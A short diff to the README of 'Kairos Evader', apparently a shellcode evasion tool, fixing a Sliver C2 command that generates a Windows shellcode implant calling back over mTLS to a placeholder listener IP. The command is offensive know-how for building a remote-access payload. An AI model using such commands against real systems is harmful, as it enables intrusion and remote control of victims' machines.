@@ -75,7 +75,7 @@ Kairos Evader is framework-agnostic - it works with any raw shellcode (but has o
 
 #### Using Sliver C2
 ```bash
-generate mtls --mtls [LISTENER-IP]:[LISTENER-PORT] --os windows --arch amd64 --format shellcode --save /home/tyler/payload.bin
+generate --mtls [LISTENER-IP]:[LISTENER-PORT] --os windows --arch amd64 --format shellcode --save /home/tyler/payload.bin
 ```
 
 ### Disclaimer
